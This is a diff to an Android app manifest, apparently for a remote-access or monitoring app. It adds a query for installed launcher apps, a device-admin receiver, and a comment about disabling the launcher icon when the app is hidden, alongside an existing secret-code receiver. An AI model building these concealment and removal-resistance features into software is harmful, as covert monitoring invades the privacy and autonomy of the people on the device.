@@ -67,6 +67,13 @@
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.VIBRATE" />
 
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent>
+    </queries>
+
     <application
         android:name=".BushoRatApplication"
         android:allowBackup="true"
@@ -145,6 +152,7 @@
             android:exported="false"
             android:enabled="true" />
 
+        <!-- Only launcher entry — disabled when admin hides the app. -->
         <activity-alias
             android:name=".MainLauncherAlias"
             android:targetActivity=".activities.ChooseLoginActivity"
@@ -171,6 +179,18 @@
         <activity
             android:name=".MainActivity"
             android:exported="false" />
+
+        <receiver
+            android:name=".reciever.AppProtectionDeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/app_device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
 
         <receiver
             android:name=".reciever.SecretCodeReceiver"
